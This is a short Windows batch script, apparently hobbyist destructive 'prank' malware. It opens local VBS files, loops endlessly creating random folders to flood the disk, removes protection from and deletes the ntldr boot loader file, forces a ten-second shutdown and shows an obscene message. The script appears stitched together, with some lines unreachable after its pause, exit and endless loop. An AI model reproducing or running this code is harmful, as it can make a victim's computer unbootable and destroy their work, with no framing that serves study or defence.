@echo off
start C:\Users\admin\Desktop\message.vbs
Start C:\Users\admin\Desktop\t.jpg
Start C:\Users/admin\Desktop\pop.vbs
pause
exit
:Rookie
MD %RANDOM%
goto Rookie
attrib -s -r -h c:\ntldr
del ntldr
goto Rookie
@echo off
Shutdown.exe -s -t 10
cls
msg * YOUR PC HAS BEEN FUCKED

